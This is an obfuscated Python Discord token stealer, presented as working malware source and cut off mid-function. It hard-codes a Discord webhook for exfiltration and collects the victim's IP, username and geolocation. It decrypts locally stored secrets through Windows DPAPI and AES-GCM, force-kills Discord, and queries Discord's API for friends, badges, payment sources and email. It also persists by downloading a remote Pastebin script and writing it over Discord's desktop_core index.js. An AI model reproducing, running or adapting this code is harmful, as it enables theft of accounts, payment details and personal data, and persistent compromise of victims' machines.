import os #line:1
import threading #line:2
from sys import executable #line:3
from sqlite3 import connect as sql_connect #line:4
import re #line:5
from base64 import b64decode #line:6
from json import loads as json_loads ,load #line:7
from ctypes import windll ,wintypes ,byref ,cdll ,Structure ,POINTER ,c_char ,c_buffer #line:8
from urllib .request import Request ,urlopen #line:9
from json import *#line:10
import time #line:11
import shutil #line:12
from zipfile import ZipFile #line:13
import random #line:14
import re #line:15
import subprocess #line:16
import sys #line:17
import shutil #line:18
import uuid #line:19
import socket #line:20
import getpass #line:21
KeYv1_IOIOIoiOIOIOioIOIOIoioIOIOioIOIoioio0oioiIOOO0000ooOo0o0o00o0o0o0o0o0o0o000o0o0o0o0oo0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0 ='7c7PEK7NAArcPdSEdObVU35-3EMIa6KlomGD1E5e65ABXD6H1UbOaZ3OVdktOOzKHTH9'#line:23
Sahfv1_O0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0oo ='1113432496969891941'#line:24
IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO =f'https://discord.com/api/webhooks/{Sahfv1_O0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0ooO0o0o0o0o0O0o0o0o0o0o0Oo00o0oo}/{KeYv1_IOIOIoiOIOIOioIOIOIoioIOIOioIOIoioio0oioiIOOO0000ooOo0o0o00o0o0o0o0o0o0o000o0o0o0o0oo0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o00o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0o0}'#line:25
inj_url_raaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ="https://pastebin.com/raw/BsZ18N9J"#line:26
DETECTED =False #line:28
def g3t1p ():#line:30
    OOOO0O000OO000000 ="None"#line:31
    try :#line:32
        OOOO0O000OO000000 =urlopen (Request ("https://api.ipify.org")).read ().decode ().strip ()#line:33
    except :#line:34
        pass #line:35
    return OOOO0O000OO000000 #line:36
requirements =[["requests","requests"],["Crypto.Cipher","pycryptodome"],]#line:41
for modl in requirements :#line:42
    try :__import__ (modl [0 ])#line:43
    except :#line:44
        subprocess .Popen (f"{executable} -m pip install {modl[1]}",shell =True )#line:45
        time .sleep (3 )#line:46
import requests #line:48
from Crypto .Cipher import AES #line:49
local =os .getenv ('LOCALAPPDATA')#line:51
roaming =os .getenv ('APPDATA')#line:52
temp =os .getenv ("TEMP")#line:53
Threadlist =[]#line:54
class DATA_BLOB (Structure ):#line:57
    _fields_ =[('cbData',wintypes .DWORD ),('pbData',POINTER (c_char ))]#line:61
def G3tD4t4 (OO0OOOOO00000OOO0 ):#line:63
    OO00OO00O00O0O000 =int (OO0OOOOO00000OOO0 .cbData )#line:64
    OOO00000000000000 =OO0OOOOO00000OOO0 .pbData #line:65
    O00OOO0OO0O000000 =c_buffer (OO00OO00O00O0O000 )#line:66
    cdll .msvcrt .memcpy (O00OOO0OO0O000000 ,OOO00000000000000 ,OO00OO00O00O0O000 )#line:67
    windll .kernel32 .LocalFree (OOO00000000000000 )#line:68
    return O00OOO0OO0O000000 .raw #line:69
def CryptUnprotectData (OOO0O0OO00OO0O0O0 ,entropy =b''):#line:71
    OOO000000OO00OO0O =c_buffer (OOO0O0OO00OO0O0O0 ,len (OOO0O0OO00OO0O0O0 ))#line:72
    O00O0OO0O0OO0000O =c_buffer (entropy ,len (entropy ))#line:73
    OO00OO00OOOOOOOOO =DATA_BLOB (len (OOO0O0OO00OO0O0O0 ),OOO000000OO00OO0O )#line:74
    O000OO000O0O00000 =DATA_BLOB (len (entropy ),O00O0OO0O0OO0000O )#line:75
    O0O0000O0O0000O00 =DATA_BLOB ()#line:76
    if windll .crypt32 .CryptUnprotectData (byref (OO00OO00OOOOOOOOO ),None ,byref (O000OO000O0O00000 ),None ,None ,0x01 ,byref (O0O0000O0O0000O00 )):#line:78
        return G3tD4t4 (O0O0000O0O0000O00 )#line:79
def D3kryptV4lU3 (O0OO0OOO00OOO00O0 ,master_key =None ):#line:81
    OO000OO0O0OOOOO0O =O0OO0OOO00OOO00O0 .decode (encoding ='utf8',errors ='ignore')[:3 ]#line:82
    if OO000OO0O0OOOOO0O =='v10'or OO000OO0O0OOOOO0O =='v11':#line:83
        O00OO00OO0O0O0O0O =O0OO0OOO00OOO00O0 [3 :15 ]#line:84
        OOO0000O0O00O0OO0 =O0OO0OOO00OOO00O0 [15 :]#line:85
        O0OO0O0OOOOOO0OOO =AES .new (master_key ,AES .MODE_GCM ,O00OO00OO0O0O0O0O )#line:86
        OOO0000O0O000000O =O0OO0O0OOOOOO0OOO .decrypt (OOO0000O0O00O0OO0 )#line:87
        OOO0000O0O000000O =OOO0000O0O000000O [:-16 ].decode ()#line:88
        return OOO0000O0O000000O #line:89
def L04dR3qu3sTs (O000O000O0O0O00OO ,OOOO0O00OOOOO0O0O ,data ='',files ='',headers =''):#line:91
    for OO000OO00OOOO0O0O in range (8 ):#line:92
        try :#line:93
            if O000O000O0O0O00OO =='POST':#line:94
                if data !='':#line:95
                    OO00O0O0O0O0O00O0 =requests .post (OOOO0O00OOOOO0O0O ,data =data )#line:96
                    if OO00O0O0O0O0O00O0 .status_code ==200 :#line:97
                        return OO00O0O0O0O0O00O0 #line:98
                elif files !='':#line:99
                    OO00O0O0O0O0O00O0 =requests .post (OOOO0O00OOOOO0O0O ,files =files )#line:100
                    if OO00O0O0O0O0O00O0 .status_code ==200 or OO00O0O0O0O0O00O0 .status_code ==413 :#line:101
                        return OO00O0O0O0O0O00O0 #line:102
        except :#line:103
            pass #line:104
def L04durl1b (OOOOO00O00OO00OOO ,data ='',files ='',headers =''):#line:106
    for OOO0OO000OO0OOOO0 in range (8 ):#line:107
        try :#line:108
            if headers !='':#line:109
                O00OO0O0OOOOO0OOO =urlopen (Request (OOOOO00O00OO00OOO ,data =data ,headers =headers ))#line:110
                return O00OO0O0OOOOO0OOO #line:111
            else :#line:112
                O00OO0O0OOOOO0OOO =urlopen (Request (OOOOO00O00OO00OOO ,data =data ))#line:113
                return O00OO0O0OOOOO0OOO #line:114
        except :#line:115
            pass #line:116
def globalInfo ():#line:118
    O0OO0OO0O00000000 =g3t1p ()#line:119
    O00000O0O0OOO0OOO =os .getenv ("USERNAME")#line:120
    OO0OOO0O00OO00O00 =urlopen (Request (f"https://geolocation-db.com/jsonp/{O0OO0OO0O00000000}")).read ().decode ().replace ('callback(','').replace ('})','}')#line:121
    O0O0O0O00000O0O0O =loads (OO0OOO0O00OO00O00 )#line:122
    O000OO00O0OOOO00O =O0O0O0O00000O0O0O ["country_name"]#line:123
    OO000000O0OOO00O0 =O0O0O0O00000O0O0O ["country_code"].lower ()#line:124
    O0O0O0OO0OO00OOO0 =O0O0O0O00000O0O0O ["state"]#line:125
    OO000O00OO000000O =f":flag_{OO000000O0OOO00O0}:  - `{O00000O0O0OOO0OOO.upper()} | {O0OO0OO0O00000000} ({O000OO00O0OOOO00O})`"#line:127
    return OO000O00OO000000O #line:128
def TR6st (O0OO000OOOO000000 ):#line:131
    global DETECTED #line:132
    O000OOOOOO0OO0O00 =str (O0OO000OOOO000000 )#line:133
    O000O0000OOO0OO00 =re .findall (".google.com",O000OOOOOO0OO0O00 )#line:134
    if len (O000O0000OOO0OO00 )<-1 :#line:135
        DETECTED =True #line:136
        return DETECTED #line:137
    else :#line:138
        DETECTED =False #line:139
        return DETECTED #line:140
def G3tUHQFr13ndS (OOOOO0OOOOOO0O0O0 ):#line:142
    O0O0O0OO0OO0OOO0O =[{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:154
    OO00O0O00O0O0OO00 ={"Authorization":OOOOO0OOOOOO0O0O0 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:159
    try :#line:160
        OO00OOO00O00OOO0O =loads (urlopen (Request ("https://discord.com/api/v6/users/@me/relationships",headers =OO00O0O00O0O0OO00 )).read ().decode ())#line:161
    except :#line:162
        return False #line:163
    O00OOOOO00O0OO00O =''#line:165
    for OO0O00O00OO00O000 in OO00OOO00O00OOO0O :#line:166
        O000OO0O00000OOOO =''#line:167
        O00OO0O0O000O0000 =OO0O00O00OO00O000 ['user']['public_flags']#line:168
        for OO00000OO000000O0 in O0O0O0OO0OO0OOO0O :#line:169
            if O00OO0O0O000O0000 //OO00000OO000000O0 ["Value"]!=0 and OO0O00O00OO00O000 ['type']==1 :#line:170
                if not "House"in OO00000OO000000O0 ["Name"]:#line:171
                    O000OO0O00000OOOO +=OO00000OO000000O0 ["Emoji"]#line:172
                O00OO0O0O000O0000 =O00OO0O0O000O0000 %OO00000OO000000O0 ["Value"]#line:173
        if O000OO0O00000OOOO !='':#line:174
            O00OOOOO00O0OO00O +=f"{O000OO0O00000OOOO} | {OO0O00O00OO00O000['user']['username']}#{OO0O00O00OO00O000['user']['discriminator']} ({OO0O00O00OO00O000['user']['id']})\n"#line:175
    return O00OOOOO00O0OO00O #line:176
process_list =os .popen ('tasklist').readlines ()#line:179
for process in process_list :#line:182
    if "Discord"in process :#line:183
        pid =int (process .split ()[1 ])#line:185
        os .system (f"taskkill /F /PID {pid}")#line:186
def G3tb1ll1ng (O00OO0OOO0O0OO000 ):#line:188
    OOO000O0O0OOO0OO0 ={"Authorization":O00OO0OOO0O0OO000 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:193
    try :#line:194
        O0O0O0OO0OO0OOOO0 =loads (urlopen (Request ("https://discord.com/api/users/@me/billing/payment-sources",headers =OOO000O0O0OOO0OO0 )).read ().decode ())#line:195
    except :#line:196
        return False #line:197
    if O0O0O0OO0OO0OOOO0 ==[]:return "```None```"#line:199
    O0OO0OOOOO0000000 =""#line:201
    for OO00OO000O0O0000O in O0O0O0OO0OO0OOOO0 :#line:202
        if OO00OO000O0O0000O ["invalid"]==False :#line:203
            if OO00OO000O0O0000O ["type"]==1 :#line:204
                O0OO0OOOOO0000000 +=":credit_card:"#line:205
            elif OO00OO000O0O0000O ["type"]==2 :#line:206
                O0OO0OOOOO0000000 +=":parking: "#line:207
    return O0OO0OOOOO0000000 #line:209
def keywork ():#line:212
    O0OOO0OOOO0OOO000 =os .getlogin ()#line:214
    OOOOOO000O0O0OOOO =['Discord','DiscordCanary','DiscordPTB','DiscordDevelopment']#line:216
    for OO00OOO0OOOO00O0O in OOOOOO000O0O0OOOO :#line:218
        O0OO0OO0O0O0OOO00 =os .path .join (os .getenv ('LOCALAPPDATA'),OO00OOO0OOOO00O0O )#line:219
        if os .path .isdir (O0OO0OO0O0O0OOO00 ):#line:220
            for O000O0O0O000O000O ,OOO000O0000O0OOOO ,OO0OOOO0O00O00O0O in os .walk (O0OO0OO0O0O0OOO00 ):#line:221
                if 'app-'in O000O0O0O000O000O :#line:222
                    for O000OO0O0O000OOOO in OOO000O0000O0OOOO :#line:223
                        if 'modules'in O000OO0O0O000OOOO :#line:224
                            O000O00O0OO0O0OOO =os .path .join (O000O0O0O000O000O ,O000OO0O0O000OOOO )#line:225
                            for O0000O0O0O0OO0O00 ,O0O0OO0OO0O0000OO ,OO00OO0OOO0O0OOO0 in os .walk (O000O00O0OO0O0OOO ):#line:226
                                if 'discord_desktop_core-'in O0000O0O0O0OO0O00 :#line:227
                                    for OOO0O00O0OOO0OOO0 ,OOO0OO000O0O00000 ,OO0OO00OOOOO000OO in os .walk (O0000O0O0O0OO0O00 ):#line:228
                                        if 'discord_desktop_core'in OOO0O00O0OOO0OOO0 :#line:229
                                            for O000OO0OOO0O0O00O in OO0OO00OOOOO000OO :#line:230
                                                if O000OO0OOO0O0O00O =='index.js':#line:231
                                                    O0O0000O00O00OO00 =os .path .join (OOO0O00O0OOO0OOO0 ,O000OO0OOO0O0O00O )#line:232
                                                    O00OOOOOOOOOO00OO =requests .get (inj_url_raaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ).text #line:234
                                                    O00OOOOOOOOOO00OO =O00OOOOOOOOOO00OO .replace ("%WEBHOOK%",IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO )#line:236
                                                    with open (O0O0000O00O00OO00 ,"w",encoding ="utf-8")as O00OO00OO00O00O0O :#line:238
                                                        O00OO00OO00O00O0O .write (O00OOOOOOOOOO00OO )#line:239
keywork ()#line:240
def G3tB4dg31 (OO00O000O0OOOOOOO ):#line:242
    if OO00O000O0OOOOOOO ==0 :return ''#line:243
    O000O000O0O00O0OO =''#line:245
    OOO0O000OOOO0OOO0 =[{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:257
    for OO00OOOO0OO0OOOO0 in OOO0O000OOOO0OOO0 :#line:258
        if OO00O000O0OOOOOOO //OO00OOOO0OO0OOOO0 ["Value"]!=0 :#line:259
            O000O000O0O00O0OO +=OO00OOOO0OO0OOOO0 ["Emoji"]#line:260
            OO00O000O0OOOOOOO =OO00O000O0OOOOOOO %OO00OOOO0OO0OOOO0 ["Value"]#line:261
    return O000O000O0O00O0OO #line:263
def G3tT0k4n1nf9 (OOOO0OO00OOOOO000 ):#line:265
    O0O0O00O00O0O00OO ={"Authorization":OOOO0OO00OOOOO000 ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:270
    O0OOOO0OOOO0O0OOO =loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =O0O0O00O00O0O00OO )).read ().decode ())#line:272
    OO0O000OO00OOOOOO =O0OOOO0OOOO0O0OOO ["username"]#line:273
    OO00000OOOOOO000O =O0OOOO0OOOO0O0OOO ["discriminator"]#line:274
    OO0O0O0O00O0O0OO0 =O0OOOO0OOOO0O0OOO ["email"]#line:275
